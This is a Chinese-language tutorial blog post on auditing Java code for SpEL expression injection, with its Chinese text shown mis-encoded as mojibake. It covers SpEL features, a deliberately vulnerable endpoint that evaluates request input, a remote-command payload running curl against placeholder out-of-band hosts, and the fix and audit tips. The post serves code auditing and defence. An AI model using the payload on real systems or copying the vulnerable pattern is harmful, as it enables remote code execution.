---
layout: post
title: 'Javaä»£ç å®¡è®¡SpELè¡¨è¾¾å¼æ³¨å…¥'
date: "2025-06-09T00:45:17Z"
---
Javaä»£ç å®¡è®¡SpELè¡¨è¾¾å¼æ³¨å…¥
=================

ç›®å½•

*   [ä¸€ã€**SpELè¡¨è¾¾å¼æ¦‚å¿µ**](#ä¸€spelè¡¨è¾¾å¼æ¦‚å¿µ)
*   [**äºŒã€SpEL çš„ä½œç”¨å’Œåº”ç”¨åœºæ™¯**](#äºŒspel-çš„ä½œç”¨å’Œåº”ç”¨åœºæ™¯)
*   [**ä¸‰ã€SpELæ”¯æŒçš„åŠŸèƒ½ç‰¹æ€§**](#ä¸‰spelæ”¯æŒçš„åŠŸèƒ½ç‰¹æ€§)
*   [**å››ã€SpELçš„æ‰§è¡Œæœºåˆ¶**](#å››spelçš„æ‰§è¡Œæœºåˆ¶)
    *   *   [**ExpressionParserï¼ˆè¡¨è¾¾å¼è§£æå™¨ï¼‰**](#expressionparserè¡¨è¾¾å¼è§£æå™¨)
        *   [**EvaluationContextï¼ˆè¡¨è¾¾å¼ä¸Šä¸‹æ–‡ï¼‰**](#evaluationcontextè¡¨è¾¾å¼ä¸Šä¸‹æ–‡)
*   [**äº”ã€SpELè¡¨è¾¾å¼ä½¿ç”¨æ–¹æ³•**](#äº”spelè¡¨è¾¾å¼ä½¿ç”¨æ–¹æ³•)
    *   *   [**1ã€åŸºäºæ³¨è§£**](#1åŸºäºæ³¨è§£)
        *   [**2ã€XML**](#2xml)
        *   [**3ã€å¤–éƒ¨ä¼ å…¥åŠ¨æ€æ‰§è¡Œ**](#3å¤–éƒ¨ä¼ å…¥åŠ¨æ€æ‰§è¡Œ)
*   [**å…­ã€SpELæ³¨å…¥ç¤ºä¾‹**](#å…­spelæ³¨å…¥ç¤ºä¾‹)
*   [**ä¸ƒã€SpELåˆ©ç”¨çš„å‰ç½®æ¡ä»¶**](#ä¸ƒspelåˆ©ç”¨çš„å‰ç½®æ¡ä»¶)
*   [**å…«ã€æ¼æ´ä¿®å¤**](#å…«æ¼æ´ä¿®å¤)
*   [**ä¹ã€å®¡è®¡æ–¹æ³•**](#ä¹å®¡è®¡æ–¹æ³•)

ä¸€ã€**SpELè¡¨è¾¾å¼æ¦‚å¿µ**
===============

**Spring Expression Languageï¼ˆSpELï¼‰** æ˜¯ Spring Framework æä¾›çš„ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œå…¨ç§°ä¸º **Spring Expression Language**ï¼Œç®€ç§° **SpEL**ã€‚å®ƒç±»ä¼¼äº Struts2 ä¸­çš„ OGNL è¡¨è¾¾å¼è¯­è¨€ï¼Œæ—¨åœ¨ä¸ºé™æ€çš„ Java è¯­è¨€å¢åŠ åŠ¨æ€æ‰§è¡Œèƒ½åŠ›ï¼Œä½¿å¼€å‘è€…å¯ä»¥ä»¥ä¸€ç§æ›´ç®€æ´ã€çµæ´»çš„æ–¹å¼è®¿é—®å¯¹è±¡å±æ€§ã€è°ƒç”¨æ–¹æ³•ã€è¿›è¡Œé€»è¾‘è¿ç®—å’ŒåŠ¨æ€èµ‹å€¼ã€‚

**äºŒã€SpEL çš„ä½œç”¨å’Œåº”ç”¨åœºæ™¯**
===================

SpEL çš„è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†ç®€åŒ–å¼€å‘å·¥ä½œï¼Œæä¾›ä¸€ç§ **åœ¨è¿è¡Œæ—¶åŠ¨æ€è§£æå’Œæ‰§è¡Œè¡¨è¾¾å¼** çš„æœºåˆ¶ï¼Œå¸¸ç”¨äºå¦‚ä¸‹åœºæ™¯ï¼š

*   é…ç½® Bean çš„å±æ€§å€¼ï¼ˆé…åˆ `@Value` æ³¨è§£ï¼‰
*   Spring Security æƒé™è¡¨è¾¾å¼
*   Spring Data JPA æŸ¥è¯¢è¡¨è¾¾å¼
*   æ¡ä»¶é€»è¾‘æ§åˆ¶ï¼ˆå¦‚ SPEL æ¡ä»¶æ³¨è§£ `@ConditionalOnExpression`ï¼‰
*   æ¨¡æ¿å¼•æ“ä¸­å¤„ç†åŠ¨æ€æ•°æ®
*   é™æ€æ–¹æ³•è°ƒç”¨æˆ–å¯¹è±¡åŠ¨æ€æ„é€ 

ä¸¾ä¸ªç®€å•ä¾‹å­ï¼Œ`@Value("#{user.name}")` èƒ½è®©ä½ åŠ¨æ€ä»æŸä¸ª Bean ä¸­è·å–å­—æ®µå€¼æ³¨å…¥åˆ°å¦ä¸€ä¸ª Bean ä¸­ã€‚

SpEL ä¸ä»…æ”¯æŒå±æ€§è®¿é—®å’Œæ–¹æ³•è°ƒç”¨ï¼Œè¿˜æ”¯æŒé›†åˆæ“ä½œã€æ­£åˆ™åŒ¹é…ã€è¡¨è¾¾å¼æ±‚å€¼ã€å¯¹è±¡åˆ›å»ºç­‰ï¼Œæ˜¯ Spring åº”ç”¨ä¸­çš„é€šç”¨è¡¨è¾¾å¼è§£æå·¥å…·ã€‚

**ä¸‰ã€SpELæ”¯æŒçš„åŠŸèƒ½ç‰¹æ€§**
=================

SpEL ä¸»è¦æ”¯æŒä»¥ä¸‹æ“ä½œï¼š

åŠŸèƒ½

ç¤ºä¾‹

æè¿°

æ–‡å­—è¡¨è¾¾å¼

`'hello'`, `123`, `true`

å­—ç¬¦ä¸²ã€æ•°å­—ã€å¸ƒå°”å€¼ã€null

å±æ€§è®¿é—®

`person.name`

è®¿é—®å¯¹è±¡å±æ€§

æ–¹æ³•è°ƒç”¨

`'abc'.toUpperCase()`

è°ƒç”¨å®ä¾‹æ–¹æ³•

é™æ€æ–¹æ³•

`T(java.lang.Math).random()`

è®¿é—® Java ç±»çš„é™æ€æ–¹æ³•æˆ–å­—æ®µ

å¯¹è±¡åˆ›å»º

`new java.util.Date()`

å®ä¾‹åŒ–å¯¹è±¡

é›†åˆæ“ä½œ

`list[0]`, `map['key']`

è®¿é—®æ•°ç»„ã€Listã€Map

å…³ç³»è¿ç®—ç¬¦

`age > 18`

æ¯”è¾ƒæ“ä½œï¼Œå¦‚ >ã€<ã€== ç­‰

é€»è¾‘è¿ç®—ç¬¦

`true and false`

`and`ã€`or`ã€`not` é€»è¾‘ç»„åˆ

æ¡ä»¶ï¼ˆä¸‰å…ƒï¼‰è¿ç®—ç¬¦

`score > 60 ? 'åŠæ ¼' : 'ä¸åŠæ ¼'`

ç®€åŒ–æ¡ä»¶åˆ¤æ–­

æ­£åˆ™è¡¨è¾¾å¼

`'abc' matches '[a-z]+'`

å­—ç¬¦ä¸²æ­£åˆ™åŒ¹é…

Bean å¼•ç”¨

`@myBean`

å¼•ç”¨ Spring å®¹å™¨ä¸­çš„ Bean

æŠ•å½±æ“ä½œ

`list.![name]`

ä»é›†åˆä¸­æå–æ¯ä¸ªå…ƒç´ çš„æŸä¸ªå±æ€§

è¿‡æ»¤æ“ä½œ

`list.?[age > 18]`

è¿‡æ»¤é›†åˆä¸­æ»¡è¶³æ¡ä»¶çš„å…ƒç´ 

å˜é‡å¼•ç”¨

`#name`, `#user.age`

ä½¿ç”¨ä¸Šä¸‹æ–‡ä¸­å®šä¹‰çš„å˜é‡

æ¨¡æ¿è¡¨è¾¾å¼

`"Welcome, #{#user.name}!"`

ä¸å­—ç¬¦ä¸²æ¨¡æ¿ç»“åˆç”ŸæˆåŠ¨æ€å­—ç¬¦ä¸²

**å››ã€SpELçš„æ‰§è¡Œæœºåˆ¶**
===============

*   `ExpressionParser`
*   `EvaluationContext`

### **ExpressionParserï¼ˆè¡¨è¾¾å¼è§£æå™¨ï¼‰**

ç”¨äºå°†å­—ç¬¦ä¸²å½¢å¼çš„è¡¨è¾¾å¼è§£æä¸º `Expression` å¯¹è±¡ï¼š

    ExpressionParser parser = new SpelExpressionParser();
    Expression expr = parser.parseExpression("user.age");
    

### **EvaluationContextï¼ˆè¡¨è¾¾å¼ä¸Šä¸‹æ–‡ï¼‰**

åœ¨æ‰§è¡Œè¡¨è¾¾å¼æ—¶æä¾›å˜é‡ã€å¯¹è±¡ã€å‡½æ•°ç­‰è¿è¡Œç¯å¢ƒï¼Œç®€å•æ¥è¯´ï¼Œå®ƒæ˜¯**è¡¨è¾¾å¼æ‰§è¡Œçš„è¿è¡Œç¯å¢ƒ**ã€‚

    StandardEvaluationContext context = new StandardEvaluationContext(user);
    int age = expr.getValue(context, Integer.class);
    

ä¸»è¦æœ‰ `StandardEvaluationContext` å’Œ `SimpleEvaluationContext`ä¸¤ç§

æœ‰äº›è€ç‰ˆæœ¬ä¸æ”¯æŒ`SimpleEvaluationContext`ï¼Œå¹¶ä¸”å¦‚æœä¸åšç‰¹æ„è¯´æ˜çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤æ˜¯ä½¿ç”¨æ›´ä¸å®‰å…¨çš„`StandardEvaluationContext`

å…¶ä¸­`StandardEvaluationContext`åŠŸèƒ½æœ€å¼ºå¤§ï¼Œæ”¯æŒSpELçš„æ‰€æœ‰ç‰¹æ€§ï¼Œè€Œ`SimpleEvaluationContext`åŠŸèƒ½å—é™ï¼Œä¸“ä¸ºå®‰å…¨åœºæ™¯è®¾è®¡

åŠŸèƒ½ç±»åˆ«

StandardEvaluationContext âœ…

SimpleEvaluationContext ğŸ›¡ï¸

è¯´æ˜

è®¾ç½®æ ¹å¯¹è±¡

âœ… æ”¯æŒ

âœ… æ”¯æŒ

è®¾ç½®è¡¨è¾¾å¼çš„é»˜è®¤ä½œç”¨å¯¹è±¡

è®¾ç½®å˜é‡

âœ… æ”¯æŒ

âœ… æ”¯æŒ

å¯ä½¿ç”¨ `#varName` å½¢å¼

æ³¨å†Œè‡ªå®šä¹‰å‡½æ•°

âœ… æ”¯æŒ

âŒ ä¸æ”¯æŒ

å¯ç”¨é™æ€æ–¹æ³•æ³¨å†Œä¸ºå‡½æ•°

è®¿é—® Java ç±»

âœ… æ”¯æŒï¼ˆT(...)ï¼‰

âŒ ä¸æ”¯æŒ

å¦‚ `T(java.lang.Math).PI`

è°ƒç”¨æ„é€ å‡½æ•°

âœ… æ”¯æŒï¼ˆnewï¼‰

âŒ ä¸æ”¯æŒ

å¦‚ `new java.util.Date()`

è®¿é—® Spring Bean

âœ… æ”¯æŒï¼ˆé…åˆ BeanResolverï¼‰

âŒ ä¸æ”¯æŒ

é€šè¿‡ `@beanName` å¼•ç”¨

æ–¹æ³•è°ƒç”¨

âœ… æ”¯æŒ

âš ï¸ ä»…æ”¯æŒ getter

å®Œæ•´æ–¹æ³•è°ƒç”¨æˆ–å±æ€§è®¿é—®

ä¿®æ”¹å±æ€§

âœ… æ”¯æŒ

âŒ ä¸æ”¯æŒ

åªè¯»ä¸Šä¸‹æ–‡ä¸å…è®¸ä¿®æ”¹

é›†åˆç­›é€‰ä¸æŠ•å½±

âœ… æ”¯æŒ

âŒ ä¸æ”¯æŒ

å¦‚ `list.?[age>18]`

è‡ªå®šä¹‰ç±»å‹è½¬æ¢å™¨

âœ… æ”¯æŒ

âŒ ä¸æ”¯æŒ

ç”¨äºè‡ªå®šä¹‰è¡¨è¾¾å¼å€¼è½¬æ¢

å®‰å…¨æ€§

âŒ ä¸å®‰å…¨

âœ… é«˜å®‰å…¨æ€§

ç”¨æˆ·è¾“å…¥ä¸åº”ä½¿ç”¨æ ‡å‡†ä¸Šä¸‹æ–‡

é€‚ç”¨åœºæ™¯

å†…éƒ¨é€»è¾‘ã€ç³»ç»Ÿé…ç½®

ç”¨æˆ·è¾“å…¥ã€RESTç»‘å®šç­‰

ç”¨äºä¿¡ä»» vs ä¸ä¿¡ä»»æ¥æº

**äº”ã€SpELè¡¨è¾¾å¼ä½¿ç”¨æ–¹æ³•**
=================

### **1ã€åŸºäºæ³¨è§£**

ä¸€èˆ¬æ˜¯å†™æ­»åœ¨ä»£ç ä¸­ï¼Œæ²¡æœ‰å¾ˆå¤§çš„å¯èƒ½èƒ½åˆ©ç”¨

    @Value("#{2 * 10}")
    private int result;
    
    @Value("#{systemProperties['user.name']}")
    private String userName;
    

### **2ã€XML**

ä¹Ÿæ˜¯å†™æ­»åœ¨ä»£ç ä¸­ï¼Œä½†æ˜¯å¯ä»¥é…åˆæŸäº›ç‰¹å®šç»„ä»¶çš„Ndayæ¼æ´åˆ©ç”¨ï¼Œå¦‚jackjsonçš„CVE-2017-17485ã€weblogicçš„CVE-2019-2725

    <bean id="exampleBean" class="com.example.MyBean">
        <property name="value" value="#{T(java.lang.Math).random() * 100}" />
    </bean>
    

### **3ã€å¤–éƒ¨ä¼ å…¥åŠ¨æ€æ‰§è¡Œ**

å¤–éƒ¨ä¼ å…¥çš„æ–¹å¼éå¸¸ä¹‹å±é™©

    @GetMapping("/spel")
    public String spel(@RequestParam String spel) {
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        Object value = expression.getValue();
        return "ç»“æœ: " + value;
    }
    

**å…­ã€SpELæ³¨å…¥ç¤ºä¾‹**
==============

        /**
         * SpEL to RCE
         * http://localhost:8080/spel/vul/?expression=xxx.
         * xxx is urlencode(exp)
         * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
         */
        @GetMapping("/spel/vuln")
        public String rce(String expression) {
            ExpressionParser parser = new SpelExpressionParser();
            // fix method: SimpleEvaluationContext
            Expression expression1 = parser.parseExpression(expression);
            Object obje = expression1.getValue();
            String obj_str = obje.toString();
            return obj_str;
    
        }
    

`ExpressionParser parser = new SpelExpressionParser();`åˆ›å»ºäº†ä¸€ä¸ªè¡¨è¾¾å¼è§£æï¼Œå°†ä¼ å…¥çš„`expression`è§£æä¸º`Expression`å¯¹è±¡

æœ€ç»ˆé€šè¿‡`getValue`æ–¹æ³•æ‰§è¡Œè¡¨è¾¾å¼ï¼Œ`parseExpression`æ–¹æ³•å¹¶ä¸ä¼šæ‰§è¡Œè¡¨è¾¾å¼ï¼Œæœ€ç»ˆçš„æ‰§è¡Œè¿˜æ˜¯åœ¨`getValue()`

é‚£ä¹ˆå¯ä»¥æ„é€ Payloadä¸º`T(java.lang.Runtime).getRuntime().exec("curl xxx.dnslog.cn")`

è¿™é‡Œè·å–Runtimeç±»ï¼Œå¹¶é€šè¿‡è°ƒç”¨`Runtime.getRuntime.exec()`è¿›è¡Œå‘½ä»¤æ‰§è¡Œ

ç›¸å…³SpELè¯­æ³•å¯è§[https://zhuanlan.zhihu.com/p/339619962](https://zhuanlan.zhihu.com/p/339619962)

![](https://img2024.cnblogs.com/blog/2588316/202506/2588316-20250608203719564-1751639506.png)

**ä¸ƒã€SpELåˆ©ç”¨çš„å‰ç½®æ¡ä»¶**
=================

é€šè¿‡ä¸Šé¢çš„å­¦ä¹ ï¼Œå¯ä»¥å‘ç°å¦‚æœæƒ³è¦å°†SpELå‡çº§æˆRCEï¼Œé‚£ä¹ˆå°±å¿…é¡»å…·å¤‡ä¸€ä¸‹ä¸‰ä¸ªæ¡ä»¶

1.  ä¼ å…¥çš„è¡¨è¾¾å¼æœªè¿‡æ»¤
2.  è¡¨è¾¾å¼è§£æä¹‹åè°ƒç”¨äº†getValue()æˆ–setValue()
3.  ä½¿ç”¨StandardEvaluationContextä½œä¸ºä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆå¦‚æœä¸æŒ‡å®šï¼ŒSpringé»˜è®¤ä½¿ç”¨StandardEvaluationContextï¼‰

**å…«ã€æ¼æ´ä¿®å¤**
==========

ä½¿ç”¨`SimpleEvaluationContext`ä»£æ›¿`StandardEvaluationContext`å³å¯

**ä¹ã€å®¡è®¡æ–¹æ³•**
==========

å…¨å±€æœç´¢expressionæˆ–æ›´è¯¦ç»†çš„è°ƒç”¨æ–¹æ³•ç­‰